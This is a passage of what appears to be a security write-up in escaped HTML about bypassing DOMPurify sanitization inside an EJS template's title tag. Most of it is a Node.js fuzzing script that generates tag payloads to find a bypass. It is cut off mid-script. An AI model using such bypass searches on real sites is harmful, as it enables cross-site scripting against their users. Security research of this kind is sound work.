href=\"https://github.com/cure53/DOMPurify/wiki/Security-Goals-&#x26;-Threat-Model\">source\u003C/a>)\u003C/p>\n\u003C/blockquote>\n\u003Cp>What this means is that even though we can’t use \u003Ccode>/\u003C/code> in our \u003Ccode>sharedby\u003C/code> variable, maybe we can somehow get DOMPurify to “fix” structural damage in such a way that it generates the \u003Ccode>&#x3C;/title>\u003C/code> tag for us followed by a \u003Ccode>style\u003C/code> tag? Well we can try this out.\u003C/p>\n\u003Ch3 id=\"fuzzing\">\u003Ca href=\"#fuzzing\">Fuzzing\u003C/a>\u003C/h3>\n\u003Cp>You can do this by fuzzing locally. Here is a script that I used:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">ejs\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">require\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'ejs'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">fs\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">require\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'fs'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">createDOMPurify\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">require\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"dompurify\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> { \u003C/span>\u003Cspan style=\"--0:#79B8FF\">JSDOM\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> } \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">require\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"jsdom\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">window\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">JSDOM\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).window;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">DOMPurify\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">createDOMPurify\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(window);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">template\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">`\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">&#x3C;head>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;meta charset=\"UTF-8\">\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;title>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">Fancy Text Viewer\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;% if (sharedby) { %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">| Shared by &#x3C;%- sharedby %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;% } %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;/title>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;!DOCTYPE html>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;html>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;head>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;link rel=\"stylesheet\" href=\"/static/style.css\">\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;/head>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">&#x3C;/head>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">&#x3C;body>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;div class=\"container\">\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#9ECBFF\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">&#x3C;/div>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">&#x3C;/body>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">`\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#99A0A6\">// FROM https://github.com/cure53/DOMPurify/blob/main/src/tags.js\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">html\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [ \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'a'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'abbr'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#F97583\">...\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">svg\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [  \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'svg'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'a'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#F97583\">...\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">random_choice\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">list\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> index \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Math.\u003C/span>\u003Cspan style=\"--0:#B392F0\">floor\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(Math.\u003C/span>\u003Cspan style=\"--0:#B392F0\">random\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">() \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> list.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">length\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> list[index];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">getIndicesOf\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">searchStr\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">str\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">caseSensitive\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> searchStrLen \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> searchStr.\u003C/span>\u003Cspan style=\"--0:#79B8FF\">length\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (searchStrLen \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">      \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">var\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> startIndex \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, index, indices \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">caseSensitive) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">str \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> str.\u003C/span>\u003Cspan style=\"--0:#B392F0\">toLowerCase\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">searchStr \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> searchStr.\u003C/span>\u003Cspan style=\"--0:#B392F0\">toLowerCase\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">while\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> ((index \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> str.\u003C/span>\u003Cspan style=\"--0:#B392F0\">indexOf\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(searchStr, startIndex)) \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">indices.\u003C/span>\u003Cspan style=\"--0:#B392F0\">push\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(index);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">startIndex \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> index \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> searchStrLen;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> indices;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> wl \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> html.\u003C/span>\u003Cspan style=\"--0:#B392F0\">concat\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(svg);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">get_injection_string\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">p\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">`&#x3C;${\u003C/span>\u003Cspan style=\"--0:#B392F0\">random_choice\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">(\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">wl\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">)\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">}>INJECT`\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> p_len \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">8\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> ( ; ; ) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> payload \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> []\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">; i \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> p_len; i\u003C/span>\u003Cspan style=\"--0:#F97583\">++\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">payload.\u003C/span>\u003Cspan style=\"--0:#B392F0\">push\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#B392F0\">get_injection_string\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(i));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> payload_main \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> payload.\u003C/span>\u003Cspan style=\"--0:#B392F0\">join\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">''\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">data\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">sharedby: DOMPurify.\u003C/span>\u003Cspan style=\"--0:#B392F0\">sanitize\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(payload_main),\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">};\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">window.document.\u003C/span>\u003Cspan style=\"--0:#B392F0\">getElementsByTagName\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'html'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)[\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">].innerHTML \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> ejs.\u003C/span>\u003Cspan style=\"--0:#B392F0\">render\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(template, data);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv 